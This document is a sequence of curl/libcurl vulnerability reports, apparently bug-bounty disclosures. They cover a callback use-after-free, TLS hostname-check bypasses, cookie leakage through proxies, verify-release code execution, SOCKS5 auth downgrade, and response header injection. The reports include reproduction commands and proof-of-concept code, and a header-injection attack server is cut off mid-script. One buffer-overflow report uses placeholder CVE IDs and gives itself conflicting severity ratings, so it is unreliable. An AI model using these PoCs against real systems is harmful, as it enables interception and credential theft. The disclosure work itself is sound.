Several libcurl upload read callback paths invoke the application-provided CURLOPT_READFUNCTION without marking the easy handle as being inside a callback. As a result, recursive multi APIs that are correctly rejected from ordinary callbacks are accepted from these upload read callback paths. I confirmed this in the TELNET read callback path and in the FTP upload resume fallback path. In both cases, calling curl_multi_remove_handle() from the affected read callback returns CURLM_OK, frees active transfer state, and libcurl later dereferences freed objects, producing AddressSanitizer-confirmed heap-use-after-free crashes. A normal HTTP CURLOPT_WRITEFUNCTION control blocks the same call with CURLM_RECURSIVE_API_CALL, showing that the expected recursive callback guard exists but is not consistently applied.

This report does not claim a standalone remote-only exploit where a malicious TELNET or FTP server can crash curl by sending bytes alone. The issue is that libcurl fails to activate its recursive API guard in some upload read callback paths, so otherwise-prohibited lifecycle/multi API calls are accepted and can corrupt active transfer state.

## Affected version
curl/libcurl version used for reproduction:

curl 8.21.0 (x86_64-pc-linux-gnu) libcurl/8.21.0 OpenSSL/3.5.0 zlib/1.2.11
Release-Date: 2026-06-24
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS HSTS HTTPS-proxy IPv6 Largefile libz SSL threadsafe TLS-SRP UnixSockets

**Platform:**
Platform: Linux x86_64
Build: local curl 8.21.0 build with OpenSSL 3.5.0
ASAN/UBSAN PoCs were linked against a local static libcurl 8.21.0 build:
  /tmp/curl-8.21.0-asan/lib/.libs/libcurl.a


## Root cause

libcurl normally marks user callbacks as active callbacks before invoking application code. While that flag is set, recursive multi APIs such as curl_multi_remove_handle(), curl_multi_cleanup(), curl_multi_perform(), and curl_multi_socket_action() are rejected with CURLM_RECURSIVE_API_CALL.

That protection works for normal callbacks. For example, calling curl_multi_remove_handle() from an HTTP CURLOPT_WRITEFUNCTION returns:

CURLM_RECURSIVE_API_CALL / API function called from within callback

However, some upload read callback paths call data->state.fread_func directly without wrapping the call with the same callback guard. I confirmed this in:
```
lib/telnet.c   TELNET CURLOPT_READFUNCTION path
lib/ftp.c      FTP upload resume fallback read path
```
Because these paths do not mark the easy handle as being inside a callback, prohibited recursive multi APIs are accepted and can remove or mutate the active transfer while the outer protocol state machine continues executing.

## Vulnerable behavior
Control case: HTTP WRITEFUNCTION

When the same prohibited API call is attempted from a normal HTTP write callback, libcurl blocks it correctly.

Observed result:
```
curl_multi_remove_handle() returned 8
API function called from within callback
No ASAN crash
```
This proves that libcurl has an intended recursive API guard for this class of callback misuse.

## TELNET positive case

When the same call is made from a TELNET CURLOPT_READFUNCTION, libcurl does not block it.

Observed result:
```
curl_multi_remove_handle() returned 0
No error
```
After the active handle/connection is removed, libcurl returns to the TELNET state machine and dereferences freed connection state. AddressSanitizer reports a heap-use-after-free in the TELNET path, including a read involving conn->created through curlx_ptimediff_ms() from telnet_do().

## FTP positive case

The same missing-guard pattern was also confirmed in the FTP upload resume fallback path.

Conditions used:
```
CURLOPT_RESUME_FROM_LARGE = 1
SEEKFUNCTION returns CURL_SEEKFUNC_CANTSEEK
FTP upload resume fallback invokes CURLOPT_READFUNCTION
```
From that read callback, curl_multi_remove_handle() returned CURLM_OK. Afterward, ASAN reported a use-after-free in ftp_statemach().

This supports treating the issue as a missing recursive callback guard family around upload read callbacks, not as a TELNET-only one-off.

## Steps To Reproduce
1. Build curl/libcurl with ASAN

From the curl source tree:
```
./configure --with-openssl --disable-shared --disable-debug \
  CFLAGS="-fsanitize=address,undefined -g -O1" \
  LDFLAGS="-fsanitize=address,undefined"

make -j"$(nproc)"
```
A release-style ASAN build is useful because debug assertions can stop execution before the UAF path is reached.

2. Compile the control PoC

Compile the HTTP control PoC that calls curl_multi_remove_handle() from CURLOPT_WRITEFUNCTION.
```
cc -fsanitize=address,undefined -g write_api_matrix.c \
  -o write_api_matrix \
  /path/to/curl/lib/.libs/libcurl.a \
  -lssl -lcrypto -lz -lpthread
```
Run it:
```
./write_api_matrix
```
Expected result:
```
curl_multi_remove_handle() returned 8
API function called from within callback
No ASAN crash
```
This is the expected safe behavior.

3. Compile the TELNET PoC

Compile the TELNET PoC that calls curl_multi_remove_handle() from CURLOPT_READFUNCTION.
```
cc -fsanitize=address,undefined -g telnet_api_matrix.c \
  -o telnet_api_matrix \
  /path/to/curl/lib/.libs/libcurl.a \
  -lssl -lcrypto -lz -lpthread
```
Run it with the included local TELNET test server, or use the standalone harness if it starts its own loopback listener.
```
python3 attacker_telnet_server.py &
./telnet_api_matrix
```
Expected result before fix:
```
curl_multi_remove_handle() returned 0
No error
AddressSanitizer: heap-use-after-free
...
READ of size ...
...
telnet_do()
curlx_ptimediff_ms()
```
The important part is that the same API call that is rejected from the HTTP callback is accepted from the TELNET read callback and then leads to UAF.

4. Compile the FTP resume fallback PoC

Compile the FTP PoC that reaches the upload resume fallback read path.
```
cc -fsanitize=address,undefined -g ftp_resume_read_remove.c \
  -o ftp_resume_read_remove \
  /path/to/curl/lib/.libs/libcurl.a \
  -lssl -lcrypto -lz -lpthread
```
Run it with the included minimal FTP server:
```
python3 mini_ftp_server.py &
./ftp_resume_read_remove
```
Expected result before fix:
```
curl_multi_remove_handle() returned 0
No error
AddressSanitizer: heap-use-after-free
...
ftp_statemach()
```
This confirms that the issue is not limited to TELNET.

Additional observations

Additional lifecycle/reentrant APIs were tested from the affected TELNET read callback path:
```
curl_multi_cleanup()       accepted, ASAN UAF
curl_easy_cleanup()        ASAN UAF
curl_multi_perform()       accepted, ASAN UAF
curl_multi_socket_action() accepted in the harness, no ASAN crash observed
curl_easy_reset()          ASAN UAF in telrcv()
curl_easy_pause()          CURLE_OK, expected for most callbacks
```
Documented CURLOPT_READFUNCTION return values alone did not produce a UAF in my testing:
```
return 0
return CURL_READFUNC_ABORT
return CURL_READFUNC_PAUSE
short read
normal data
```
This means the current confirmed impact depends on a callback invoking a prohibited or risky libcurl lifecycle/multi API. The bug is that affected read callback paths fail to engage the guard that normally rejects those calls.

I attached a small repro package: curl-h1-rare03-repro.zip.

It contains:
- README.md with build/run instructions
- VERSION.txt with the curl -V output used for reproduction
- 3 PoCs:
  - HTTP WRITEFUNCTION negative control
  - TELNET READFUNCTION positive case
  - FTP resume fallback positive case
- local TELNET/FTP test servers
- sample ASAN logs from my curl/libcurl 8.21.0 ASAN build

The intended flow is:
1. Build curl/libcurl 8.21.0 with ASAN/UBSAN.
2. Set CURL_SRC to that ASAN-built source tree.
3. Run ./run_all.sh.

Expected results:
- HTTP control: curl_multi_remove_handle() is rejected with CURLM_RECURSIVE_API_CALL.
- TELNET case: the same call returns CURLM_OK and then ASAN reports UAF.
- FTP resume fallback case: the same call returns CURLM_OK and then ASAN reports UAF.

This is meant to demonstrate that the recursive callback guard exists and works for normal callbacks, but is not engaged in these upload read callback paths.

## Impact

## Summary:
Applications embedding libcurl with TELNET or FTP upload-resume flows can crash or corrupt heap state if application callback logic, plugin code, scripting bindings, FFI layers, or extension code invoke libcurl lifecycle/multi APIs from affected CURLOPT_READFUNCTION paths.

The demonstrated impact is:

ASAN-confirmed heap-use-after-free
Reliable process crash
Active transfer state freed and then used by libcurl

I did not demonstrate code execution, information disclosure, controlled write-after-free, double-free, or a remote-server-only trigger. A remote TELNET or FTP server can influence timing and application-level conditions that lead a callback to cancel a transfer, but the UAF still requires the application callback to invoke a prohibited or risky libcurl API.

The security-relevant point is that libcurl already enforces a recursive callback guard in ordinary callbacks. The affected upload read callback paths fail to activate that guard, so calls that should return CURLM_RECURSIVE_API_CALL instead return CURLM_OK and corrupt active transfer state.

title: mbedTLS / wolfSSL / rustls backends silently skip hostname verification when CURLOPT_SSL_VERIFYPEER=0
weakness: Improper Validation of Certificate with Host Mismatch
body:
## Summary

When an application sets `CURLOPT_SSL_VERIFYPEER=0` while keeping
`CURLOPT_SSL_VERIFYHOST=2` (the default), the mbedTLS, wolfSSL, and rustls
TLS backends silently skip the hostname-vs-certificate check. The OpenSSL,
GnuTLS, and Schannel backends correctly preserve hostname checking under
the same configuration.

`docs/libcurl/opts/CURLOPT_SSL_VERIFYPEER.md` lines 57-59 explicitly state:

> *"The check that the host name in the certificate is valid for the
> hostname you are connecting to is **done independently of the
> CURLOPT_SSL_VERIFYPEER(3) option**."*

Result: an MITM holding any valid certificate (the CN does not need to
match the requested host) can intercept TLS sessions to any HTTPS target
when an application disables peer chain verification — a common pattern
with self-signed / internal-CA deployments. `Authorization`, `Cookie`, and
POST bodies all leak to the attacker.

## Affected backends

```
$ src/curl --version    # all four built from the same source tree
curl 8.21.1-DEV (x86_64-pc-linux-gnu) libcurl/8.21.1-DEV OpenSSL/3.5.6   ← rc=60 (correct)
curl 8.21.1-DEV (x86_64-pc-linux-gnu) libcurl/8.21.1-DEV mbedTLS/3.6.5    ← rc=0 (BUG)
curl 8.21.1-DEV (x86_64-pc-linux-gnu) libcurl/8.21.1-DEV wolfSSL/5.7.2    ← rc=0 (BUG)
curl 8.21.1-DEV (x86_64-pc-linux-gnu) libcurl/8.21.1-DEV rustls-ffi/0.15.3 ← rc=0 (BUG)
```

Affected versions: **all curl releases through HEAD master** for the
mbedTLS, wolfSSL, and rustls backends. The mbedTLS code path traces to
commit `88cae145509` (2024-08-17, "mbedtls: add more informative logging"),
shipped in 8.10.0 and unchanged through current master.

The relevant code sites:

- **mbedTLS** — `lib/vtls/mbedtls.c::mbed_verify_cb`:
  ```c
  if(!conn_config->verifypeer)
      *flags = 0;                /* clears CN_MISMATCH along with chain flags */
  else if(!conn_config->verifyhost)
      *flags &= ~MBEDTLS_X509_BADCERT_CN_MISMATCH;
  ```
  `*flags = 0` zeroes the entire mbedTLS verify-flag bitmap, including
  `MBEDTLS_X509_BADCERT_CN_MISMATCH`. mbedTLS uses
  `MBEDTLS_SSL_VERIFY_REQUIRED` and trusts whatever flags this callback
  returns.

- **wolfSSL** — `lib/vtls/wolfssl.c::Curl_wssl_ctx_init`:
  ```c
  wolfSSL_CTX_set_verify(wctx->ssl_ctx, conn_config->verifypeer ?
                         WOLFSSL_VERIFY_PEER : WOLFSSL_VERIFY_NONE, NULL);
  ```
  When `verifypeer=0`, `WOLFSSL_VERIFY_NONE` makes wolfSSL skip the entire
  certificate-validation pipeline including the hostname check registered
  by `wolfSSL_check_domain_name` further down.

- **rustls** — `lib/vtls/rustls.c::cr_init_backend` (line 1048-1050):
  ```c
  if(!conn_config->verifypeer) {
      rustls_client_config_builder_dangerous_set_certificate_verifier(
          config_builder, cr_verify_none);
  }
  ```
  `cr_verify_none` (line 389) is a callback that returns `RUSTLS_RESULT_OK`
  unconditionally. It replaces rustls's default `ServerCertVerifier`, which
  in rustls performs both chain validation **and** hostname matching against
  the SNI value passed to `rustls_client_connection_new`. Replacing it
  disables both at once.

## Steps to reproduce

A self-contained Docker reproduction package is attached
(`verifyhost-repro.tar.gz`). It pulls the latest curl source from
`github.com/curl/curl.git`, builds four libcurls from the same source tree
(OpenSSL, mbedTLS, wolfSSL, rustls backends), runs a TLS server presenting
a wrong-CN certificate, and drives a libcurl client at all four backends.

```sh
tar xzf verifyhost-repro.tar.gz
cd docker
./build_and_run.sh
```

(Pass a tag/branch/SHA as arg to pin: `./build_and_run.sh curl-8_21_0`.)

Expected output:

```
================================================================
  curl source commit:       <SHA from official curl/curl repo>
  OpenSSL curl --version:   curl 8.21.1-DEV libcurl/8.21.1-DEV OpenSSL/3.5.6 ...
  mbedTLS curl --version:   curl 8.21.1-DEV libcurl/8.21.1-DEV mbedTLS/3.6.5 ...
  wolfSSL curl --version:   curl 8.21.1-DEV libcurl/8.21.1-DEV wolfSSL/5.7.2 ...
  rustls  curl --version:   curl 8.21.1-DEV libcurl/8.21.1-DEV rustls-ffi/0.15.3 ...
================================================================

============== OpenSSL backend (control) — expect rc=60 ==============
* SSL: certificate subject name 'wrong.example.com' does not match target hostname 'target.example.com'
=== RESULT: rc=60 (SSL peer certificate or SSH remote key was not OK) ===

============== mbedTLS backend — expect rc=0 (BUG) ==============
< HTTP/1.1 200 OK
< Content-Length: 7
=== RESULT: rc=0 (No error) ===

============== wolfSSL backend — expect rc=0 (BUG) ==============
< HTTP/1.1 200 OK
=== RESULT: rc=0 (No error) ===

============== rustls backend — expect rc=0 (BUG) ==============
< HTTP/1.1 200 OK
=== RESULT: rc=0 (No error) ===
```

The OpenSSL run is the control: same source tree, same flags, same PoC
code — only the TLS backend differs. Its `rc=60` confirms that the PoC
correctly enforces `verifyhost=2` and that the `rc=0` on the other three
backends is a backend defect, not a PoC mistake.

## Files in the package

- `Dockerfile` — Debian trixie + mbedTLS 3.6.5 + OpenSSL 3.x + wolfSSL 5.7.2 + rustls-ffi 0.15.3
- `build_and_run.sh` — wrapper: `docker build` then `docker run`
- `run.sh` — entrypoint inside container; drives all four scenarios
- `poc.c` — minimal libcurl PoC
- `poc_server.py` — Python TLS server presenting CN=wrong.example.com

## ████████
████████

## Impact

## Summary:

An MITM on the network path can fully impersonate the intended HTTPS
server using any certificate (no need to match the requested hostname),
decrypting and modifying the entire TLS session. The application has
opted out of chain verification but explicitly kept hostname verification
on per the documented contract; libcurl silently disables both.

# Vulnerability Report: Buffer Overflow in Path Sanitization

## Summary
Multiple buffer overflow vulnerabilities exist in the `src/tool_doswin.c` file due to insufficient bounds checking and improper memory management in path sanitization functions.

## Affected Components
- `sanitize_file_name` (line ~180)
- `msdosify` (line ~120)
- `rename_if_reserved_dos` (line ~70)

## Vulnerability Details

### CVE-2024-XXXX-A: Integer Overflow in Path Length Calculation
**Location**: `msdosify` function  
**Description**: Performs arithmetic operations on path lengths without proper validation, leading to potential integer overflow and subsequent buffer overflows.

### CVE-2024-XXXX-B: Improper Bounds Checking in Path Expansion
**Location**: `rename_if_reserved_dos` function  
**Description**: Modifies strings in-place without checking if resulting paths exceed buffer boundaries, potentially causing heap corruption.

### CVE-2024-XXXX-C: Missing Null-Termination in String Operations
**Location**: Multiple functions in `tool_doswin.c`  
**Description**: String manipulation functions fail to properly null-terminate strings, leading to memory safety issues.

## Proof of Concept
```c
// Exploit for CVE-2024-XXXX-A
char malicious_path[PATH_MAX + 100] = "C:\\";
memset(malicious_path + 4, 'A', PATH_MAX + 96);
malicious_path[PATH_MAX + 99] = '\0';

char *sanitized;
sanitize_file_name(&sanitized, malicious_path, SANITIZE_ALLOW_PATH);
```

## Impact
- Potential heap corruption
- Denial of service
- Memory disclosure
- Possible code execution

## Recommendation
Add proper bounds checking for all path operations, implement input validation for path lengths, use safer string manipulation functions with explicit size parameters, and consider implementing a bounded string buffer abstraction.

**CVSS Score**: 7.5 (High)  
**Severity Classification**: Critical  

This vulnerability affects curl versions prior to the fix and impacts command-line applications that process user-supplied filenames.

title: Secure cookies leaked to HTTP origins through HTTPS forwarding proxy
body:
## Summary:
When curl accesses an `http://` origin through an HTTPS forwarding proxy, it sends Secure cookies in the request. The cookies travel in cleartext between the proxy and the origin server, visible to the proxy operator and anyone on that network path. curl also reports `CURLINFO_SCHEME` as `"https"` to the application for what is an `http://` transfer, which can mislead application-level security logic.

This is a regression introduced on 2026-06-12 in [commit 73daec6](https://github.com/curl/curl/commit/73daec6620bf9983df89e8df3660bfa3b8fd501d) ([PR #21967](https://github.com/curl/curl/pull/21967)). [proxy.c:652](https://github.com/curl/curl/blob/bb837dd/lib/proxy.c#L652) sets `conn->scheme` to the proxy's HTTPS scheme. `Curl_secure_context()` ([cookie.c:1273](https://github.com/curl/curl/blob/bb837dd/lib/cookie.c#L1273)) checks `conn->scheme->protocol & CURLPROTO_HTTPS` and returns TRUE, so Secure cookies are included. Before this commit, `conn->scheme` held the origin's scheme and Secure cookies were correctly withheld.

The same `conn->scheme` change causes [url.c:2505](https://github.com/curl/curl/blob/bb837dd/lib/url.c#L2505) to report `CURLINFO_SCHEME` as `"https"` for an `http://` origin.

## Affected version
```
$ curl  --version
curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.0.20 zlib/1.2.13 brotli/1.0.9 zstd/1.5.4 libpsl/0.21.2 nghttp2/1.52.0
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli HSTS HTTP2 HTTPS-proxy IPv6 Largefile libz PSL SSL threadsafe TLS-SRP UnixSockets zstd
```

Only affected since commit [73daec6](https://github.com/curl/curl/commit/73daec6620bf9983df89e8df3660bfa3b8fd501d) (2026-06-12). No released version is affected. Still present on origin/master at [79a2416](https://github.com/curl/curl/commit/79a24161ab) as of 2026-06-15.

## Steps To Reproduce:

A self-contained Dockerfile and patch (`fix.patch`) are attached. The Dockerfile builds three curl binaries from source: pre-regression (`c951368`), regression (`bb837dd`), and regression with the suggested fix applied. It also runs a Squid HTTPS forwarding proxy and a plain HTTP origin server that logs received cookies.

```bash
docker build -t cookie-proxy .
docker run --rm -it cookie-proxy
```

Inside the container, test each binary:

```bash
curl-safe  -sv -x https://127.0.0.1:8443 --proxy-insecure -b /tmp/cookies.txt http://test.example:8080/path
curl-vuln  -sv -x https://127.0.0.1:8443 --proxy-insecure -b /tmp/cookies.txt http://test.example:8080/path
curl-fixed -sv -x https://127.0.0.1:8443 --proxy-insecure -b /tmp/cookies.txt http://test.example:8080/path
```

Check what the origin received:

```bash
tail /tmp/origin.log
```

`curl-vuln` leaks the Secure cookie (the verbose output includes a `Cookie:` header, and the origin log confirms receipt). `curl-safe` and `curl-fixed` withhold it (no `Cookie:` header, origin log shows `RECEIVED no Cookie header`).

## Suggested fix

A patch is attached (`fix.patch`). `Curl_secure_context()` should check `data->state.origin->scheme` instead of `conn->scheme`. The refactor already migrated most security checks to `data->state.origin` but missed this function. The `conn->scheme` assignment at [proxy.c:652](https://github.com/curl/curl/blob/bb837dd/lib/proxy.c#L652) is still needed for SSL filter setup, so it should stay, but `Curl_secure_context()` should not read it. `Curl_xfer_is_secure()` is not affected because it has an additional `Curl_conn_is_ssl()` check that correctly excludes proxy SSL filters ([cfilters.c:693](https://github.com/curl/curl/blob/bb837dd/lib/cfilters.c#L693)).

## Impact

Secure cookies (session tokens, auth cookies, CSRF tokens) are sent in cleartext over the HTTP connection between the HTTPS proxy and the origin server. Anyone who can observe that network path can read them. The proxy operator can harvest them regardless. The `CURLINFO_SCHEME` misreporting can also trick application-level security checks (e.g. "only allow this action over HTTPS") into treating an insecure transfer as secure.

The bug affects all HTTP methods (GET, HEAD, POST, PUT, DELETE, PATCH, etc.) because the Secure context check runs in `Curl_cookie_getlist` ([cookie.c:1300](https://github.com/curl/curl/blob/bb837dd/lib/cookie.c#L1300)), which is called from the request header construction path for every method. WebSocket upgrade requests (`ws://` through the proxy) are also affected. Any libcurl application using the cookie engine (`CURLOPT_COOKIEFILE` / `CURLOPT_COOKIEJAR`) through an HTTPS proxy is affected, not just the curl CLI.

RFC violated: [RFC 6265](https://datatracker.ietf.org/doc/html/rfc6265#section-5.4) Section 5.4 step 3 ties "secure channel" to the `https` URI scheme ([RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-2.7.2) Section 2.7.2). The request uses `http://`, so Secure cookies must not be sent regardless of the TLS transport to the proxy.

title: verify-release rebuilds from the tarball under verification, enabling pre-check command execution and false OK for a malicious curl release tarball
weakness: Reliance on Untrusted Inputs in a Security Decision
body:
## Summary:
`scripts/verify-release` is documented as a way to independently verify a downloaded curl release tarball, but on `curl-8.20.0` it extracts the tarball under verification and executes `./configure` and `./scripts/dmaketgz` before any trust decision is made.

This creates a circular trust failure: attacker-chosen commands from the tarball run in the verifier context before authenticity/integrity is established, and the same malicious tarball can still be reported as `curl-8.20.0.tar.gz: OK`.

Using a trusted verifier copied from the clean official tag `curl-8_20_0`, with the tarball as the only attacker-controlled input, I reproduced verifier-side attacker-chosen command execution from a malicious tarball built with curl’s own release tooling.

`strace -f -e execve` shows `execve("./configure", ...)` before `execve("/usr/bin/sha256sum", ["sha256sum", "-c", "checksum"], ...)`, while the final result is still `curl-8.20.0.tar.gz: OK`.

This is a source-package / distribution-integrity issue, not a generic infrastructure issue.

## Affected version
Confirmed affected: `8.20.0` source release (`curl-8_20_0` tag).

Likely affected: `8.10.0+`, because `verify-release` first shipped in `8.10.0`.

Platform used for reproduction:
`Linux kali 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.12-1kali1 (2026-02-25) x86_64 GNU/Linux`

## Steps To Reproduce:
1. Use a clean official curl repository checkout and extract the trusted verifier from the clean release tag:
   `git show curl-8_20_0:scripts/verify-release > trusted-verify-release && chmod +x trusted-verify-release`

2. Run the attached PoC `poc_verify_release_trust_failure.sh` against the clean repo.

3. The PoC downloads the official `curl-8.20.0.tar.gz`, confirms that the official tarball and the clean official tag do not contain the payload marker, injects a safe source-level payload into `configure.ac`, rebuilds a malicious tarball using the official `./scripts/dmaketgz`, and then runs the trusted verifier under `strace -f -e execve`.

4. Observe the decisive output:
   - `official_tar_has_payload=no`
   - `trusted_tag_has_payload=no`
   - `pre_auth_exec=yes`
   - `configure_execve=...execve("./configure", ["./configure", "--without-ssl", "--without-libpsl"], ...)`
   - `sha256sum_execve=...execve("/usr/bin/sha256sum", ["sha256sum", "-c", "checksum"], ...)`
   - `curl-8.20.0.tar.gz: OK`

5. Observe the proof file produced by the attacker-chosen payload:
   - `uid=1000 gid=1000 user=nobcoder`
   - `cwd=/tmp/.../curl-8.20.0`
   - `argv0=./configure`
   - `HOME=set`
   - `USER=set`
   - `SHELL=set`
   - `PATH=set`
   - `GNUPGHOME=unset`
   - `SSH_AUTH_SOCK=set`
   - `GITHUB_VAR_COUNT=0`

6. Observe that the malicious tarball accepted by the verifier had SHA-256:
   - `378a4c4de88b2cd55b6933faf1b61ba838130c754938226b4ed0f6716559678c`

I have attached:
- the stronger PoC,
- verifier log,
- `strace` exec-order log,
- proof file,
- and a ZIP bundle with all evidence.

## Impact

Impact:

## Summary:
An attacker who can cause a verifier to run curl’s documented `verify-release` workflow on a malicious release tarball can achieve verifier-side attacker-chosen local command execution before authenticity is established, while the trusted verifier still returns a false successful result (`curl-8.20.0.tar.gz: OK`).

This breaks the exact release-integrity property curl claims for `verify-release`: signatures prove origin, while `verify-release` is presented as the mechanism that should detect a release manager or release host adding extra malicious content to an official release. The current implementation cannot do that because it rebuilds from the tarball being verified.

I did not attempt to access or exfiltrate secrets. My proof only demonstrates execution-context visibility and false verification.

title: Incomplete Suppression of  Transfer-Encoding: chunked Header in HTTP/2 After Redirect From HTTP/1.1
body:
When curl  send a request with `Transfer-Encoding: chunked` using HTTP/1.1, and follows a redirect to an HTTP/2 endpoint, the `upload_chunky` flag is not properly reset. As a result, the `Transfer-Encoding: chunked` header is sent in the subsequent request even when HTTP/2 is negotiated/used.

This violates RFC 9113 (HTTP/2) which states that HTTP/2 uses its own farming and `Transfer-Encoding` header must not be used.

##Proof OF Concept
Setup:
Local test server with HTTP/1.1 ---> HTTPS (HTTP/2) redirect 
`Reproduction Command:`
```bash
curl -vvv --http1.1 --no-alpn -L --http2 -k \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Type: text/plain" \
  -d "This is chunked encoding bug test data" \
  http://test.local:8080/
```
##Observed Behavior:
- First request (HTTP/1.1): `Transfer-Encoding: chunked` --> Correct
- Second request (after redirect): 'Transfer-Encoding: chunked' is still present ---> Vulnerable Even with `--http2` flag, the header is not suppressed.

##Root Cause
in 'lib/http.c'
- `http_req_set_TE()` and 'http_add_content_hds()' functions only check HTTP version at intial request setup.
- During redirect handling ('Curl_follow_Location()' / new Request setup), the 'data->req.upload_chunky' falg is not relible reset when protocol changes from HTTP/1.1 ---> HTTP/2.

## Impact

- Protocol confusion between client and server / proxies.
- potential for `HTTP Request Smuggling / Desync attack` in enviroments with reverse proxies or CDNs that handle HTTP/1.1 <--> HTTP/2 translation.
- Unexpected behavior in middleboxes and caching systems.

title: SOCKS5 no-auth accepted despite username/password-only authentication
body:
## Summary:

curl/libcurl appears to allow unauthenticated SOCKS5 negotiation even when the caller explicitly configures username/password-only SOCKS5 authentication. With `--socks5-basic` and SOCKS5 credentials set, curl still advertises both SOCKS5 method `0x00` (no authentication) and `0x02` (username/password). If the proxy selects `0x00`, curl proceeds with the transfer without performing username/password authentication. This appears to contradict the documented `CURLOPT_SOCKS5_AUTH` behaviour, where `CURLAUTH_BASIC` allows username/password authentication and `CURLAUTH_NONE` is the flag that allows no authentication. The impact is a caller-policy bypass: an application or operator may believe SOCKS5 username/password authentication is required, while the transfer can still complete through unauthenticated SOCKS5.

## Affected version

Reproduced against current curl source:

```text
Repository: https://github.com/curl/curl.git
Commit: d3e9a815c4a68099b774742073c50b996d69fcd6
Commit date: 2026-06-05T16:57:38+02:00
Commit subject: tidy-up: miscellaneous
```

`curl -V` output from the validation build:

```text
curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.5.5 zlib/1.3.1 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.68.0 OpenLDAP/2.6.10
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt mqtts pop3 pop3s rtsp scp sftp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli Debug HSTS HTTP2 HTTPS-proxy HTTPSRR IDN IPv6 Largefile libz PSL SSL threadsafe TLS-SRP UnixSockets zstd
```

Test platform: Linux local validation harness.

## Steps To Reproduce:

I used a minimal local SOCKS5 proxy fixture that records curl’s initial SOCKS5 greeting and then chooses which authentication method to select.

The curl invocation used SOCKS5 username/password credentials and requested username/password SOCKS5 authentication with:

```text
--socks5-basic
```

The relevant expectation is:

```text
CURLOPT_SOCKS5_AUTH tells libcurl which SOCKS5 authentication methods are allowed.
CURLAUTH_BASIC allows username/password authentication.
CURLAUTH_NONE allows no authentication.
--socks5-basic maps to CURLOPT_SOCKS5_AUTH=CURLAUTH_BASIC.
```

Observed SOCKS5 greeting:

```text
05 02 00 02
```

Interpreted as:

```text
05       SOCKS version 5
02       two methods offered
00       no authentication
02       username/password
```

So curl advertises both no-auth and username/password even though username/password-only SOCKS5 auth was configured.

Case 1: proxy selects no-auth:

```text
Proxy selected: 0x00
Result: curl proceeded to the HTTP request.
Username/password exchange: none.
Transfer: successful.
```

Runtime transcript:

```text
CASE choice=0x00 exit=0 stdout=b'OK' stderr=b'' methods=['0x00', '0x02'] greeting=05020002 auth=None http_seen=True
```

Case 2: proxy selects username/password:

```text
Proxy selected: 0x02
Result: curl performed the expected username/password authentication exchange.
Transfer: successful.
```

Runtime transcript:

```text
CASE choice=0x02 exit=0 stdout=b'OK' stderr=b'' methods=['0x00', '0x02'] greeting=05020002 auth=('user', 'pass') http_seen=True
```

Expected behaviour:

```text
When configured with username/password-only SOCKS5 authentication, curl should not advertise method 0x00 no-auth.
If a proxy selects a method that was not allowed by the caller's SOCKS5 auth configuration, curl should reject the negotiation.
```

Observed behaviour:

```text
curl advertises no-auth and accepts no-auth when selected by the proxy.
```

I can provide the minimal local proxy fixture and full runtime evidence bundle as a seperate attachment if useful.

## Impact

The issue is not that a proxy can choose no-auth. The issue is that curl offers no-auth even after the caller has explicitly asked for username/password SOCKS5 authentication. (!)

As I understand the API, `CURLOPT_SOCKS5_AUTH` is not just a preference hint. It defines which SOCKS5 authentication methods libcurl is allowed to use. `CURLAUTH_BASIC` means username/password. `CURLAUTH_NONE` is the separate option for unauthenticated SOCKS5.

So when a caller uses `--socks5-basic` or `CURLOPT_SOCKS5_AUTH=CURLAUTH_BASIC`, they are making a security decision: do not proceed through unauthenticated SOCKS5.

The observed behaviour breaks that expectation. curl still offers `0x00` no-auth on the wire, and if the proxy selects it, curl continues without the username/password exchange.

This would be a real problem on for systems (like ours) where authenticated proxy use is part of the security model, for example auditability, routing policy, tenant separation, delegation or proxy-side authorisation. In those cases, curl can silently take a weaker path than the caller configured.

Also if this is part of a security policy anywhere it's not doing the secure thing intended.

title: libcurl: HTTP/1.x bare LF byte in response header value enables cookie jar pollution and POST body/credential exfiltration via redirect — RC=0, curl 8
body:
Summary
curl's HTTP/1.x response header parser splits header lines using a single memchr(buf, '\n', blen) call (lib/http.c:4457), with no awareness of whether the current position is inside a quoted-string value. A server response containing any header field whose value embeds a raw LF byte (\x0a) causes the parser to create synthetic new header lines from the bytes following that LF.
This single-byte injection enables two independent attacks confirmed locally on curl 8.20.0 (Android aarch64, 2026-04-29):
Attack A — Cookie jar pollution (requires -c / --cookie-jar): Any bytes forming Set-Cookie: ... are silently written to curl's cookie jar. RC=0, no warning.
Attack B — POST body and credential exfiltration via redirect (requires -L / --location): Any bytes forming Location: http://... are treated as a valid redirect target. With a 307/308 response, the full POST body is forwarded to the attacker's target. With --location-trusted, the Authorization header is also forwarded.
Both attacks share the same root cause and the same patch. RC=0 in all cases. No existing CVE covers either vector.
Note: AI assistance was used in drafting and structuring this report. All technical claims were independently verified by running the PoCs on curl 8.20.0 (aarch64-unknown-linux-android, Release-Date: 2026-04-29).
Steps To Reproduce
Environment
curl 8.20.0 (aarch64-unknown-linux-android)
libcurl/8.20.0 OpenSSL/3.6.2 zlib/1.3.2
Release-Date: 2026-04-29
Python 3.x
Attack A — Cookie Jar Pollution
Save as attack_a.py and run python3 attack_a.py:
#!/usr/bin/env python3
import socket, threading, subprocess, tempfile, time, os

PORT = 19811

def server():
    payload = (
        b'HTTP/1.1 200 OK\r\n'
        b'Authentication-Info: nextnonce="val\n'
        b'Set-Cookie: session=ATTACKER_INJECTED; Path=/\r\n'
        b'X-Absorb: "\r\n'
        b'Content-Length: 5\r\n\r\nhello'
    )
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
